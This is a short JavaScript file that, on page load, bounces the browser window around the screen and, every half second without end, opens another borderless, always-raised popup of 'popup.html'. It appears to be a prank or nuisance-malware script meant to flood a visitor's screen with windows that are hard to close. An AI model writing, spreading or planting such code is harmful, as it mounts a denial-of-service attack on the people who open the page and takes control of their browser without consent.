let xOff = 5;
let yOff = 5;
let xPos = 400;
let yPos = -100;

function randomRange(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1) + min);
}

function openWindow(url) {
    window.open(
        url,
        "_blank",
        'menubar=no,status=no,toolbar=no,resizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes'
    );
}

function newXlt() {
    xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
}

function newXrt() {
    xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function newYup() {
    yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
}

function newYdn() {
    yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function playBall() {
    xPos += xOff;
    yPos += yOff;

    if (xPos > screen.width - 175) {
        newXlt();
    }
    if (xPos < 0) {
        newXrt();
    }
    if (yPos > screen.height - 100) {
        newYup();
    }
    if (yPos < 0) {
        newYdn();
    }

    window.moveTo(xPos, yPos);
    setTimeout(() => {
        openWindow('popup.html');
        playBall();
    }, 500);
}

window.onload = function () {
    playBall();
};
